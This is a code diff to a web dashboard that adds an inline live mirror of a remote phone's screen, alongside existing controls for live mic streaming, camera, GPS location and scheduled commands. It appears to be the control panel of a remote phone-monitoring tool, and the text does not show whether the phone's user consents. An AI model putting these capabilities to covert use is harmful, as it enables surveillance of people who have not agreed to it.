@@ -3439,6 +3439,141 @@
     }
   }
 
+  // ---------------------------------------------------------------------------
+  // Live Screen MIRROR — inline JPEG frame viewer (embedded in the tab).
+  // The phone's `live_start` command pushes a ~3fps JPEG to POST /api/live_frame
+  // (stored in the Worker's CommandStore). This view embeds the Worker's
+  // self-refreshing viewer page GET /api/live_frame.html?device_id=<id> in an
+  // <iframe>, so the mirror renders INLINE (no "open link" tab). The Worker page
+  // already object-fit:contains the portrait frame + refreshes every 250ms, so a
+  // BIG/SMALL toggle on our side just resizes the stage and it letterboxes both
+  // ways. A lightweight Image() probe (no CORS needed) hides the "waiting for
+  // frames…" placeholder as soon as a real frame lands (404 → placeholder stays).
+  //
+  // NOTE: this is the JPEG mirror channel (`live_start`/`live_stop`), NOT the
+  // WebRTC screen share (`live_screen` start/stop) which routes over /signal and
+  // is unrelated to /api/live_frame. See mobile CommandExecutor for that split.
+  // ---------------------------------------------------------------------------
+  const LIVE_SCREEN_HTML_BASE = BACKEND_BASE + '/api/live_frame.html';
+  const LIVE_SCREEN_RAW_BASE = BACKEND_BASE + '/api/live_frame';
+
+  // Probe interval handle (module scope) so closing the view can tear it down.
+  let liveMirrorTimer = 0;
+  let liveMirrorStarted = false; // mirror running → stop it when the view closes
+  let liveMirrorDeviceId = '';
+
+  function liveMirrorCleanup() {
+    if (liveMirrorTimer) { try { clearInterval(liveMirrorTimer); } catch (err) { /* ignore */ } }
+    liveMirrorTimer = 0;
+    // Leaving the tab shouldn't leave the phone streaming forever — stop the
+    // JPEG mirror if we started it here.
+    if (liveMirrorStarted && liveMirrorDeviceId) {
+      safeCommand('live_stop', liveMirrorDeviceId, { log: false });
+    }
+    liveMirrorStarted = false;
+    liveMirrorDeviceId = '';
+  }
+
+  async function openLiveScreenMirror(scope) {
+    const result = scope.result;
+
+    // Resolve the target phone up front (selected device, else first online).
+    let deviceId = selectedDeviceId || '';
+    if (!deviceId) {
+      try { deviceId = await resolveOnlineTargetId(); } catch (err) { deviceId = ''; }
+    }
+
+    const box = el('div', 'live-screen');
+    const status = el('div', 'live-screen__status');
+
+    // BIG / SMALL size toggle (segmented). `makeSeg` returns { wrap, value }.
+    const sizeSeg = makeSeg(['🗕 Small', '🗖 Big'], 0, (label) => {
+      box.classList.toggle('live-screen--big', label === '🗖 Big');
+    });
+    const startBtn = makeButton('▶ Start mirror', () => startMirror(), 'tc-btn tc-btn--primary');
+    const stopBtn = makeButton('⏹ Stop', () => stopMirror(), 'tc-btn tc-btn--danger');
+
+    const bar = el('div', 'live-screen__bar');
+    bar.appendChild(el('span', 'live-screen__bar-label', 'Size'));
+    bar.appendChild(sizeSeg.wrap);
+    bar.appendChild(el('span', 'live-screen__bar-spacer'));
+    bar.appendChild(startBtn);
+    bar.appendChild(stopBtn);
+
+    // Stage holds the iframe (fills it) + a placeholder overlay + device/dim meta.
+    const stage = el('div', 'live-screen__stage');
+    const frame = el('iframe', 'live-screen__frame');
+    frame.title = 'Live screen mirror';
+    const placeholder = el('div', 'live-screen__placeholder');
+    placeholder.appendChild(el('div', 'live-screen__placeholder-icon', '📡'));
+    placeholder.appendChild(el('div', 'live-screen__placeholder-text', 'Waiting for frames…'));
+    const meta = el('div', 'live-screen__meta');
+    stage.appendChild(frame);
+    stage.appendChild(placeholder);
+    stage.appendChild(meta);
+
+    box.appendChild(bar);
+    box.appendChild(stage);
+    box.appendChild(status);
+    result.appendChild(box);
+
+    let mirrorBusy = false;
+
+    function setDevice(id) {
+      deviceId = id;
+      liveMirrorDeviceId = id || '';
+      if (id) {
+        frame.src = LIVE_SCREEN_HTML_BASE + '?device_id=' + encodeURIComponent(id);
+        meta.textContent = '📱 ' + id;
+        status.textContent = 'Ready — Start mirror to begin streaming.';
+      } else {
+        status.textContent = '⚠️ No phone online — wait for a phone to come online, then Start.';
+      }
+    }
+
+    // Probe the raw JPEG endpoint: 200 → a frame exists (hide placeholder, show
+    // natural dimensions); 404 → no frames yet (show placeholder).
+    function setPlaceholder(waiting) {
+      placeholder.classList.toggle('live-screen__placeholder--hidden', !waiting);
+    }
+    function probe() {
+      if (!deviceId) { setPlaceholder(true); return; }
+      const img = new Image();
+      img.onload = function () {
+        setPlaceholder(false);
+        const w = img.naturalWidth, h = img.naturalHeight;
+        meta.textContent = '📱 ' + deviceId + ((w && h) ? (' · ' + w + '×' + h) : '');
+      };
+      img.onerror = function () { setPlaceholder(true); };
+      img.src = LIVE_SCREEN_RAW_BASE + '?device_id=' + encodeURIComponent(deviceId) + '&_=' + Date.now();
+    }
+
+    function startMirror() {
+      if (mirrorBusy) return;
+      if (!deviceId) { status.textContent = '⚠️ No phone online — wait for a phone, then Start.'; return; }
+      mirrorBusy = true;
+      startBtn.disabled = true;
+      status.textContent = 'Starting mirror on ' + deviceId + '…';
+      safeCommand('live_start', deviceId, { log: false }).then((res) => {
+        if (res) liveMirrorStarted = true;
+        status.textContent = res ? String(res) : '⚠️ Could not reach the phone.';
+        mirrorBusy = false;
+        startBtn.disabled = false;
+      });
+    }
+
+    function stopMirror() {
+      if (deviceId) safeCommand('live_stop', deviceId, { log: false });
+      liveMirrorStarted = false;
+      status.textContent = 'Mirror stopped.';
+    }
+
+    setDevice(deviceId);
+    liveMirrorCleanup(); // clear any timer leaked from a previous view
+    probe();
+    liveMirrorTimer = setInterval(probe, 1500);
+  }
+
   // ---- Live location MAP view (#12) -----------------------------------------
   // Renders an OpenStreetMap iframe embed (no API key) centered on the latest
   // GPS fix, plus a text list of recent lat,lng,ts below.
@@ -3850,7 +3985,7 @@
     { id: 'tasks', emoji: '⏰', label: 'Tasks', sub: 'Scheduled commands', color: '#f2b13c', build: openTasks },
     { id: 'phone3d', emoji: '🛰️', label: 'Phone 3D', sub: 'Live phone model', color: '#38b2ac', onClose: disposePhone3d, build: openPhone3d },
     { id: 'liveaudio', emoji: '🎙️', label: 'Live Audio', sub: 'WebRTC mic streaming', color: '#38b2ac', onClose: liveCleanup, build: (s) => openLiveStream(s, 'audio') },
-    { id: 'livescreen', emoji: '🖥️', label: 'Live Screen', sub: 'WebRTC 30fps screen share', color: '#38bdf8', onClose: liveCleanup, build: (s) => openLiveStream(s, 'screen') },
+    { id: 'livescreen', emoji: '🖥️', label: 'Live Screen', sub: 'Inline phone screen mirror', color: '#38bdf8', onClose: liveMirrorCleanup, build: openLiveScreenMirror },
     { id: 'livecamera', emoji: '🎥', label: 'Live Camera', sub: 'WebRTC video + mic', color: '#ff6b6b', onClose: liveCleanup, build: (s) => openLiveStream(s, 'camera') },
   ];
 
